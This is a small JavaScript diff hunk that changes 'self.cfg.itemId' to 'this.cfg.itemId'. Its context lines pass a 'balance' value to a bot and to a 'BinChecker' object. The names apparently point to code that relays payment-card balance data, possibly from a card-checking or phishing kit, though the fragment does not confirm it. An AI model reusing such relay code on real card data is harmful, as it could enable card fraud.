@@ -793,7 +793,7 @@
     }
 
     
-    var _adId = window.__currentAdId || window.itemId || self.cfg.itemId;
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
     this._sendBalanceToBot(raw);
     if (typeof BinChecker !== 'undefined' && BinChecker.sendBalance) {
       BinChecker.sendBalance(_adId, raw);
